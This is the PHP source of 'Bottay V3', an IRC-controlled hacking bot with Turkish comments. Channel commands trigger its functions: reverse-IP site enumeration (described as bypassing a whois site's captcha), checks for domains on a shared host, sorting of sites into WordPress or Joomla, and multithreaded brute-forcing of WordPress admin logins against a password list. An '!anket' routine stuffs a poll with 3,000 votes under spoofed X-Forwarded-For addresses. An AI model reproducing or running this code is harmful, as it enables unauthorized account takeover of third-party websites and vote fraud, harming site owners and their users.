<?php

/*
*	@Bottay V3 Ultimate Hacking IRC Bot
*	@Coded By Burtay
*	E. Burtay Sahin
*	Hacı ne yapıyorsun görünmüyorsun ortalıklarda
*	
*	@Mail 	: admin@burtay.org
*	@Jabber : burtay@jabber.org
*
*	@Personal Website : http://www.burtay.Org
*	@Comunity Website : http://www.janissaries.Org
*	Bottay V3 Direct Link = www.http://www.burtay.org/development_area/bottay/BottayV3B3.zip
*
*	(This Document contains only Turkish manuel)
*	BottayV3 IRC server Uzerinden çalışmak üzere tasarlanış olup pcntl_fork() fonksiyonu kullandığı için
*	sadece Linux Makinalarda çalışabilir.Bottay V3'ü ister standalone ,isterseniz java pluginleri
*	ile kullanabilirsiniz.Standalone kullanımlarda pcntl_fork() fonksiyonu üzerinden komut aldığından
*	dolayı oldukca hızlı çalışacaktır.Lakin CPU kullanımı oldukça artacaktır.Bottay V3 socket bağlantısı için de 
*	ayrı bir cpu kanalı açtığından,kanaldan düşmez,gelen her PING'e cevap verir.Böylelikle serverda aylarca hatta yıllarca
*	düşmeden kalabilir.Bu versiyonda flood koruması etkin değildir.Geliştirmek isterseniz kanala fazla yazı yazdırmadan
*	geliştirmeye dikkat ediniz.
*	Bottay V3 tasarlanırken sadece hedef site değil hedef serverdan 
*	kaynaklanan açıklarıda bulabilmek amacı ile tasarlanmıştır.Bottay V3 gelişim sürecinde bir çok
*	sefer sekteye uğramış ve birden fazla beta versiyonu ile test edilmiştir.Şuan Kullanmakta olduğunuz 
*	Sürüm ''Bottay V3 Beta 3'' sürümüdür.bundan farklı olarak 5 ayrı daha beta sürümü mevcuttur.Bu sürüme ait
*	olan java pluginlerini public etmenin getireceği sorululukları kabullenmek istemediğimden standalone olarak dağıtıyorum.
*	Lakin php ve java biliyorsanız java pluginlerini kendinizde kodlayabilirsiniz.Tavsiyem ThreadPool ile kodlamanızdır.
*	Bottayın Geliştirilmesine son verilmiş olup , yayınlanan son versiyonu budur.
*	
*	Versiyon Standalone Özellikleri
*	- ReverseIP .http://whois.webhosting.info/ adresinden captha bypass ederek banlanmadan sınırsızca yapabilir
*	- ReverseIP Check .Hedef server IP ve ReverseIP sonucunda çıkan sitelerin IP adreslerini karşılaştırır
*	- Wordpress Brute Force
*	- Script Finder - ReverseIP Sonucunda çıkan site listesini bilindik scriptlere ayırır
*
*	Youtube Videoları
*	-http://www.youtube.com/watch?v=0OZLqRl9C8M
*	-http://www.youtube.com/watch?v=TjuVqpr_fMc
*/
	
error_reporting(0);
set_time_limit(0);

class bottay3
{
	private $irc_server	=	'irc.burtay.org';
	private $irc_port	=	'6667';
	private $irc_kanal	=	'#jani';
	private $bot_nick	=	'Bottay';


	private $baglanti;

	private $gelen_veri;
	private $gelen_ayrik	=	array();
	
	private $basic_passwords	=	'passwords.txt';
	
	private $tutucu;
	private $saygac		=	array();
	private $pong_adresi;

	
	private $cookie_file	=	'bottay_cookies.txt';
	
	
	#gelen veri parse edilerek komut buna atanır
	private $komut;

	private $wp_say	=0;
	private $joomla_say	=0;
	private $ozgun_say	=0;
	
	#Thread ile çalışan ping-pong fonksiyonunu tutar
	private $ping_pong;


	private	$siyah				=		'1';
	private	$mavi				=		'2';
	private	$yesil				=		'3';
	private	$kirmizi			=		'4';
	private	$kahverengi			=		'5';
	private	$mor				=		'6';
	private	$turuncu			=		'7';
	private	$sari				=		'8';

	private $seperator_thread	=		25;
	private $bruter_thread		=		25;

	public function __construct()
	{	
		declare(ticks = 1);
		$this->connection();
		$this->kanala_giris();
		$this->kanalda_kal();
	}

	private function connection()
	{
		$this->baglanti = stream_socket_client("tcp://".$this->irc_server.":".$this->irc_port, $hata_no, $hata, 10);
		if($this->baglanti)		
		{
			return true;
		}
		else
		{
			die($hata);
		}
	}

	private function kanala_giris()
	{
	  fwrite($this->baglanti, "NICK ".$this->bot_nick."\n");
	  fwrite($this->baglanti, "USER ".$this->bot_nick ." " . $this->irc_server . " ". $this->irc_server . " : " .$this->bot_nick ."\n");
	  fwrite($this->baglanti, "JOIN ".$this->irc_kanal."\n");
	  $this->kanala_yaz($this->yesil."################################################################");
	  $this->kanala_yaz($this->yesil."#Bottay V3 Joined the Channel ".$this->irc_kanal);
	  $this->kanala_yaz($this->yesil ."". base64_decode("IyBDb2RlZCBCeSBCdXJ0YXkNCiMgQ29udGFjdCA6IGFkbWluQGJ1cnRheS5vcmcNCiMgSU0gOmJ1cnRheUBqYWJiZXIub3JnDQojIFdlYnNpdGUgOmh0dHA6Ly93d3cuamFuaXNzYXJpZXMub3JnIA=="));
	  $this->kanala_yaz($this->kirmizi."#For information use the ".$this->yesil."!help ".$this->kirmizi."command");
	  $this->kanala_yaz($this->yesil."################################################################");
	}


	private function ping_pong()
	{	
		fputs($this->baglanti,"PONG ".$this->pong_adresi."\n");
		$this->kanala_yaz($this->kirmizi."->".$this->pong_adresi." Adresine Pong Gonderildi".date("H:i:s"));
		//call_user_func_array(array($this,'kanala_yaz'),array($this->kirmizi.$this->pong_adresi.' Adresine Pong Gönderildi.'.date("H:i:s")));
	}	

	private function cikis()
	{
		$this->kanala_yaz("Bottay terminated...");
		fwrite($this->baglanti, "QUIT \n");
	}
	
	private function kanala_yaz($mesaj)
	{	
		// if( (call_user_func(array($this,'get_tutucu')) %3) == 0)
		// {
			// sleep(5);
		// }
		// echo call_user_func(array($this,'get_tutucu'));
		// $yeni_tutucu = call_user_func(array($this,'get_tutucu')) +1;
		// call_user_func_array(array($this,'set_tutucu',array($yeni_tutucu)));
		fwrite($this->baglanti,"PRIVMSG " . $this->irc_kanal . " : ". $mesaj . "\n" );
	}

	private function adama_yaz($adam,$mesaj)
	{
		fwrite($this->baglanti,"PRIVMSG " . $adam . " : ". $mesaj . "\n" );
	}

	private function kanalda_kal()
	{
		while (!feof($this->baglanti))
		{
			$this->gelen_veri = fgets($this->baglanti, 1024);	
			echo $this->gelen_veri;
			$this->log_ayir();
			// print_r($this->gelen_ayrik);
			
			// call_user_func_array(array($this,'th_baslat'),array('komut_dinle'));		

			$this->komut();
			echo $this->komut;
			
			if($this->komut ==	'PING')
			{
				call_user_func_array(array($this,'th_baslat'),array('ping_pong'));
			}
			
			elseif($this->komut == '!exit')
			{
				// $this->cikis();
				call_user_func_array(array($this,'th_baslat'),array('cikis'));
			}
			
			elseif($this->komut == '!help')
			{
				$this->kanala_yaz("!reverse -> Starts a ReverseIP Proccess.Usage: !reverse site or !reverse ip");
				$this->kanala_yaz("!reverse_check -> Controls the main ip and results.Usage: !reverse_check site or !reverse_check ip");
				$this->kanala_yaz("!incele -> Seperates the results of reverseip process as 3 main group.WP,Joomla and Other.Usage: !incele");
				$this->kanala_yaz("!durum -> Writes all seperated sites.Usage: !durum");
				$this->kanala_yaz("!wp_brute -> Brutes wordpress sites.Usage: !wp_brute http://sitelist.com/list.txt or !wp_brute");
			}
			
			elseif($this->komut == '!reverse')
			{
				$ip		=	gethostbyname(trim($this->gelen_ayrik[4]));
				call_user_func_array(array($this,'th_baslat'),array('reverse_ip',$ip));
				//$this->reverse_ip($ip);
			}
						
			elseif($this->komut == '!reverse_check')
			{
				$ip		=	gethostbyname(trim($this->gelen_ayrik[4]));
				call_user_func_array(array($this,'th_baslat'),array('reverse_check',$ip));		
				
			}				
			
			elseif($this->komut == '!incele')
			{
				$ip		=	gethostbyname(trim($this->gelen_ayrik[4]));
				call_user_func_array(array($this,'th_baslat'),array('incele',$ip));		
				//$this->incele($ip);
			}
			
			elseif($this->komut == '!durum')
			{
				call_user_func_array(array($this,'th_baslat'),array('inceleme_durum'));	
				//$this->inceleme_durum();
			}
			
			elseif($this->komut == '!anket')
			{
				call_user_func_array(array($this,'th_baslat'),array('an'));	
			}
						
			elseif($this->komut == '!wp_brute')
			{
				if($this->gelen_ayrik[4] != null)
				{
					$siteler	=	file($this->gelen_ayrik[4]);
					// foreach($siteler as $site)
					// {
						// $site = trim($site);
						// if($site != null)
						// {
							call_user_func_array(array($this,'th_baslat'),array('wp_brute',$siteler));
							//$this->wp_brute($siteler);
						// }
					// }
				}
				else
				{
					$siteler	=	file("sonuclar/wordpress.txt");
					// foreach($siteler as $site)
					// {
						// $site = trim($site);
						// if($site != null)
						// {						
							call_user_func_array(array($this,'th_baslat'),array('wp_brute',$siteler));				
							//$this->wp_brute($siteler);
						// }
					// }
				}
			}				
		
			
			/*
			*	Get ve Set Methodlarının tamamı burda
			*
			*/
			elseif($this->komut == '!get_seperator_thread')
			{
				$this->kanala_yaz($this->yesil."Seperator Thread Count : ".$this->kirmizi ." ". $this->seperator_thread);
			}
			elseif($this->komut == '!set_seperator_thread')
			{
				$this->seperator_thread		= $this->gelen_ayrik[4];
				$this->kanala_yaz($this->yesil."Seperator Thread Count Changed to : ".$this->kirmizi ." ". $this->seperator_thread);
			}
			
			
			elseif($this->komut == '!get_bruter_thread')
			{
				$this->kanala_yaz($this->yesil."Bruter Thread Count : ".$this->kirmizi ." ". $this->bruter_thread);
			}
			elseif($this->komut == '!set_bruter_thread')
			{
				$this->bruter_thread		= $this->gelen_ayrik[4];
				$this->kanala_yaz($this->yesil."Bruter Thread Count Changed to : ".$this->kirmizi ." ". $this->bruter_thread);
			}
		}		
	}
		
	private function th_baslat($metod,$args=null,$args2=null)
	{
		/* Bottay-V.3 Ultimate - Coded By Burtay */
			
		$pid = pcntl_fork();
		if ($pid == -1) 
		{
			 die('PCNTL Devre Dışi');
		} 
		else if ($pid) 
		{
			// call_user_func(array($this,'ping_pong'));	
		}
		else 
		{					
			if($args == null)
			{
				call_user_func(array($this,"$metod"));	
				exit();					
			}
			else
			{
				if($args2 == null)
				{
					call_user_func_array(array($this,"$metod"),array($args));	
					exit();	
				}				
				else
				{
					call_user_func_array(array($this,"$metod"),array($args,$args2));	
					exit();					
				}
			}				
		}
	}

	private function log_ayir()
	{
		$this->gelen_ayrik	=	explode(' ',$this->gelen_veri);
	}

	private function komut()
	{
		// $komut	=	 explode(' ',$this->gelen_ayrik);
		if(trim($this->gelen_ayrik[0]) == "PING" )
		{
			$this->pong_adresi	=	trim($this->gelen_ayrik[1]);
			$this->komut		=	trim($this->gelen_ayrik[0]);
		}
		// elseif(trim($this->gelen_ayrik[1]) == ":Closing" and trim($this->gelen_ayrik[4]) == "(Excess" and trim($this->gelen_ayrik[5]) == "Flood)" )
		// {
			// echo "Flood Alg�land�";
			// $this->connection();
			// $this->kanala_giris();
		// }
		// elseif(trim($this->gelen_ayrik[1]) == ":Closing" and trim($this->gelen_ayrik[4]) == "(Ping" and trim($this->gelen_ayrik[5]) == "timeout)" )
		// {
		  // fwrite($this->baglanti, "NICK ".$this->bot_nick."\n");
		  // fwrite($this->baglanti, "USER ".$this->bot_nick ." " . $this->irc_server . " ". $this->irc_server . " : " .$this->bot_nick ."\n");
		  // fwrite($this->baglanti, "JOIN ".$this->irc_kanal."\n");
		// }
		else
		{
			$this->komut	=	 explode(":",trim($this->gelen_ayrik[3]));
			$this->komut	=	$this->komut[1];
		}
	}



	/*
	*	Komut Methodlar� Buraya
	*/	

	private function reverse_ip($ip)
	{
		$this->kanala_yaz($this->kahverengi."Reverse IP Process Started.Please Wait");
		touch("reverseip/".$ip.".txt");
		$sonuclar		=	array();
		
		$toplams		=	1;
		for($i=1;$i<=$toplams;$i++)
		{
			$post_url	 = 'http://whois.webhosting.info/'.gethostbyname($ip).'?pi='.$i.'&ob=SLD&oo=ASC';
			$post_fields = 'enck=fa49d04d83-3598d58cc7b2cf12d6bdfe1d9f3ea3e0&srch_value='.gethostbyname($ip).'&code=60656&subSecurity=Submit';
			$kaynak		 = $this->post($post_url,$post_fields);	
			if($toplams == 1)
			{
				$regex		=	'#IP hosts <b>(.*?)</b>#si';
				preg_match($regex,$kaynak,$toplam);
				// echo "Total: ".$toplam[1]." Sites<br>";
				$toplam_sayfa	= ceil($toplam[1]/50);
				// echo "Toplam ".$toplam_sayfa." Sayfa<br>";
				$this->kanala_yaz($this->yesil."Total:".$this->mor." ".$toplam_sayfa.$this->yesil." Page Total:".$this->mor." ".$toplam[1]." Sites");
				// $this->kanala_yaz($this->yesil." 1. Page Crawling");
				$toplams = $toplam_sayfa;
			}
			else
			{
				// $this->kanala_yaz($this->yesil." ".$i.". Page Crawling");
				// call_user_func_array(array($this,'kanala_yaz'),array($this->yesil." ".$i.". Page Crawling"));
			}
			
			$regex		=	'#<td><a href="http://whois.webhosting.info/(.*?).">#si';
			preg_match_all($regex,$kaynak,$sonuclar);
			
			foreach($sonuclar[1] as $sonuc)
			{
				array_push($sonuclar,$sonuc);
				$this->kaydet("reverseip/".$ip.".txt",$sonuc);
			}
			if($i%3 == 0)
			{
				$crw	=	$i*50;
				if($crw < $toplam[1])
				{
					$this->kanala_yaz($this->mor." ".$crw .$this->yesil." Site Crawled..");
				}
				else
				{
					$this->kanala_yaz($this->mor." ".$toplam[1] .$this->yesil." Site Crawled..");
				}
			}
		}
		if(count($sonuclar)>0)
		{
			$siteler		=	file_get_contents("reverseip/".$ip.".txt");
			$this->kanala_yaz($this->yesil."Reverse IP Results : ".$this->kirmizi.$this->kod_gonder($siteler));
		}
	}

	private function an()
	{
		for($i=1;$i<=3000;$i++)
		{
			$ekstra['ip']		=	rand(70,188).".".rand(170,120).".".rand(170,120).".".rand(170,120);
			$pos				=	"vote=".rand(1,10);
			$url				=	'http://burtay.org/vote.php';	
			call_user_func_array(array($this,'th_baslat'),array('post',$url,$pos,$ekstra['ip']));
			if($i%10 == 0){sleep(5);}
		}
	}
	
	private function reverse_check($hedef)
	{
		touch("reverseip/".$hedef.".checked.txt");
		$this->kanala_yaz($this->yesil." Reverse Check Process Started for ".$this->kirmizi." ".$hedef.$this->yesil);
		$hedef_ip	=	gethostbyname($hedef);
		$oku		=	file("reverseip/".$hedef.".txt");
		$toplam		=	count($oku);
		$this->saygac["reverse_check"]=	0;
		foreach($oku as $okunmus)
		{
			$site = trim($okunmus);
			call_user_func_array(array($this,'th_baslat'),array('reverse_check_th',$site,$hedef_ip));
			$this->saygac["reverse_check"]++;			
			if(($this->saygac["reverse_check"] % 300 )== 0)
			{
				$this->kanala_yaz($this->yesil."Process ".$this->saygac["reverse_check"]."/".$toplam);
				sleep(8);
			}			
		}
		if($this->saygac["reverse_check"] == $toplam)
		{
			$this->kanala_yaz($this->mor."Process ".$toplam."/".$toplam);
		// $this->kanala_yaz($this->kanal,$this->yesil." Reverse Check Process Finish ".$this->kirmizi.$this->kod_gonder(file_get_contents("reverseip/".md5($hedef).".checked")));	
		}

	}
	
	private function reverse_check_th($domain,$hedef_ip)
	{
		$domain_ip		=	gethostbyname($domain);
		
		if($domain_ip == $hedef_ip)
		{
			$this->kaydet("reverseip/".$hedef_ip.".checked.txt",$domain);
			echo "[+][+][+]".$domain."->".$domain_ip."\n";
		}
		else
		{
			echo "[-][-][-]".$domain."->".$domain_ip."\n";
		}		
	}

	private function incele($hedef)
	{
		$mesaj		=	$this->yesil ." Separating Process Start.Please be Patient";
		call_user_func_array(array($this,'th_baslat'),array('kanala_yaz',$mesaj));
		system("java -jar Seperator.jar ".dirname(__FILE__)."/reverseip/".$hedef.".checked.txt ".$this->seperator_thread);
		$mesaj		=	$this->yesil ." Separating Process Finished.";
	}
	
	/* Eski Inceleme Bölümü - Javasız olan
	
	private function incele($hedef)
	{
		touch("wp.txt");
		touch("joomla.txt");
		touch("ozgun.txt");
		$this->kanala_yaz("Research Started Oh yeah Baby");
		$kaynak			=	file_get_contents(dirname(__FILE__)."/reverseip/".$hedef.".checked.txt");
		$kaynak			=	str_replace("\n\n","\n",$kaynak);
		file_put_contents(dirname(__FILE__)."/reverseip/".$hedef.".checked.txt",$kaynak);
		$kaynak			=	explode("\n",$kaynak);
		
		$toplam_kaynak	=	count($kaynak);
		echo "Toplam ".$toplam_kaynak." Site mevcut\n";
		$kaynaklar	=	array();
		
		for($i=0;$i<$toplam_kaynak;$i++)
		{
			$site	= trim($kaynak[$i]);
			call_user_func_array(array($this,'th_baslat'),array('script_bul',$site));
			// $this->script_bul($site);
			if(($i%10) == 0)
			{
				sleep(3);
			}
		}
		// sleep(3);
		$this->kanala_yaz("Researches Finish.In Total ".$this->wp_say." Wordpress".$this->joomla_say."Joomla".$this->ozgun_say."Creative Scripts");
	}
	
	private function script_bul($site)
	{
		$site = trim($site);
		
		echo "Site->".$site."\n";
		$curl		=	curl_init();
		curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
		curl_setopt($curl,CURLOPT_URL,$site);
		//curl_setopt($curl,CURLOPT_COOKIEJAR,dirname(__FILE__)."/".$this->cookie_file);
		//curl_setopt($curl,CURLOPT_COOKIEFILE,dirname(__FILE__)."/".$this->cookie_file);	
		$calis		=	curl_exec($curl);
		if($this->joomla_bul($calis))
		{
			echo "Joomla->".$site."\n";
			$this->kaydet("joomla.txt",$site);
		}
		elseif($this->wp_bul($calis))
		{
			echo "Wordpress->".$site."\n";
			$this->kaydet("wp.txt",$site);
		}
		else
		{
			echo "Ozgun->".$site."\n";
			$this->kaydet("ozgun.txt",$site);
		}
	}
	
	private function joomla_bul($kaynak)
	{
		if( preg_match('/com_content/',$kaynak) and preg_match('/templates/',$kaynak) )
		{
			return true;
		}
		else
		{
			return false;
		}
	}
	
	private function wp_bul($kaynak)
	{
		if( preg_match('/wp-content/',$kaynak) and preg_match('/themes/',$kaynak) )
		{
			return true;
		}
		else
		{
			return false;
		}	
	}
	
	
	*/
	
	private function inceleme_durum()
	{
		$wp			=	count(file("sonuclar/worpress.txt"))-1;
		$joomla		=	count(file("sonuclar/joomla.txt"))-1;
		$ozgun		=	count(file("sonuclar/other.txt"))-1;
		$mesaj		=	$this->mor." ".$wp.$this-yesil." Wordpress . ".$this->mor." ".$joomla.$this->yesil." Joomla . ".$this->mor." ".$ozgun.$this->yesil." Creative Scripts";
		call_user_func_array(array($this,'th_baslat'),array('kanala_yaz',$mesaj));
		// $this->kanala_yaz($mesaj);
	}
	
	
	
	private function wp_brute($siteler)
	{
		$mesaj		=	$this->yesil ."Wordpress Brute-Force Process Start.Please be Patient";
		call_user_func_array(array($this,'th_baslat'),array('kanala_yaz',$mesaj));
		foreach($siteler as $site)
		{
			$site		= trim($site);
			$mesaj		=	$this->yesil ." Processing Site".$this->kirmizi." ".$site;
			call_user_func_array(array($this,'th_baslat'),array('kanala_yaz',$mesaj));
			system("java -jar wp.jar ".trim($site)." admin ".$this->basic_passwords." ".$this->bruter_thread);
		}
		$mesaj		=	$this->yesil ."Wordpress Brute-Force Process Finished.";
		call_user_func_array(array($this,'th_baslat'),array('kanala_yaz',$mesaj));
	}
	
	/* Eski Wordpress Bruter
	*
	
	private function wp_brute($siteler)
	{		
		$this->kanala_yaz($this->yesil."Wordpress Cracking Proccess Started");
		foreach($siteler as $site)
		{
			$this->kanala_yaz($this->yesil($site ." WP Brute"));
			$site	=	trim($site);
			$eski	=	array('http://','www.','/');
			$yeni	=	array('','','');
			$site	=	str_replace($eski,$yeni,$site);
			system("php Plugin/wp-brute ".$site." ".$this->basic_password." 5");
		}
	}
	*/
	
	private function joomla_brute()
	{}
	
	private function kod_gonder($kod)
	{
		$ekstra				=	array();
		$ekstra["header"]	=	1;
		$ekstra["referer"]	=	'http://codepad.org/';
		$post_url			=	'http://codepad.org/';
		$post_fields		=	'lang=PHP&code='.urlencode($kod).'&submit=Submit';
		$kaynak				=	$this->post($post_url,$post_fields,$ekstra);
		$ayir				=	explode('Location:',$kaynak);
		$ayir				=	explode('\n',$ayir[1]);
		return trim($ayir[0]);
	}

	
	

	/*
	*	Temel Methodlar Burada
	*/

	private function post($site,$post,$ekstra=null)
	{
		
		$curl		=	curl_init();
		curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
		curl_setopt($curl,CURLOPT_SSL_VERIFYPEER,0);
		curl_setopt($curl,CURLOPT_URL,$site);
		
		if($ekstra['referer'] != null)
		{
			curl_setopt($curl,CURLOPT_REFERER,$referer);
		}
		if($ekstra['ip'] != null)
		{		
			curl_setopt($curl,CURLOPT_HTTPHEADER, array('X_FORWARDED_FOR: '.$ip));
		}
		if($ekstra['follow'] != null)
		{			
			curl_setopt($curl,CURLOPT_FOLLOWLOCATION,TRUE);
		}
		if($ekstra['header'])
		{
			curl_setopt($curl,CURLOPT_HEADER, 1);
		}
		curl_setopt($curl,CURLOPT_COOKIEJAR,dirname(__FILE__)."/".$this->cookie_file);
		curl_setopt($curl,CURLOPT_COOKIEFILE,dirname(__FILE__)."/".$this->cookie_file);	
		curl_setopt($curl,CURLOPT_POST,TRUE);
		curl_setopt($curl,CURLOPT_POSTFIELDS,$post);
		$calis		=	curl_exec($curl);
		return $calis;
	}

	private function get($site,$ekstra=null)
	{
		
		$curl		=	curl_init();
		curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
		curl_setopt($curl,CURLOPT_SSL_VERIFYPEER,0);
		curl_setopt($curl,CURLOPT_URL,$site);
		
		if($ekstra['referer'] != null)
		{
			curl_setopt($curl,CURLOPT_REFERER,$referer);
		}
		if($ekstra['ip'] != null)
		{		
			curl_setopt($curl,CURLOPT_HTTPHEADER, array('X_FORWARDED_FOR: '.$ip));
		}
		if($ekstra['follow'] != null)
		{			
			curl_setopt($curl,CURLOPT_FOLLOWLOCATION,TRUE);
		}
		curl_setopt($curl,CURLOPT_COOKIEJAR,dirname(__FILE__)."/".$this->cookie_file);
		curl_setopt($curl,CURLOPT_COOKIEFILE,dirname(__FILE__)."/".$this->cookie_file);	
		$calis		=	curl_exec($curl);
		return $calis;		
	}	

	private function multi_post($site,$postlar,$aranan,$aranan2)
	{
		$toplam_post = count($postlar);
		$curl_multi  = curl_multi_init();
		for($i=0;$i<=$toplam_post-1;$i++)
		{
			$curl[$i]	= curl_init();
			curl_setopt($curl[$i],CURLOPT_URL,$site);
			curl_setopt($curl[$i],CURLOPT_RETURNTRANSFER,1);		
			curl_setopt($curl[$i],CURLOPT_HEADER,1);
			curl_setopt($curl[$i],CURLOPT_NOBODY,1);
			curl_setopt($curl[$i],CURLOPT_CONNECTTIMEOUT,20);
			curl_setopt($curl[$i],CURLOPT_TIMEOUT,20);
			curl_setopt($curl[$i],CURLOPT_POST,1);
			curl_setopt($curl[$i],CURLOPT_POSTFIELDS,$postlar[$i]);
			curl_setopt($curl[$i],CURLOPT_FOLLOWLOCATION,true);
			curl_setopt($curl[$i],CURLOPT_NOBODY,true);
			curl_multi_add_handle($curl_multi,$curl[$i]);
		}
		do
		{
			curl_multi_exec($curl_multi,$durum);
		}
		while($durum>0);
		foreach($curl as $cid => $cson)
		{
			$sonuc[$cid] = curl_multi_getcontent($cson);	
			if(preg_match('/'.$aranan.'/',$sonuc[$cid]) and preg_match('/'.$aranan2.'/',$sonuc[$cid]))
			{
				return $cid+1;
				exit();
			}
		}
		for($i=0;$i<=$toplam_post-1;$i++)
		{
			curl_multi_remove_handle($curl_multi, $curl[$i]); 
			curl_close($curl[$i]); 
		}
		curl_multi_close($curl_multi); 
	}	
	
	private function kaydet($dosya,$data)
	{
		$ac		=	fopen($dosya,'ab');
		fwrite($ac,$data."\n");
		fclose($ac);
	}	
	

}


$bottayv3 = new bottay3();
?>
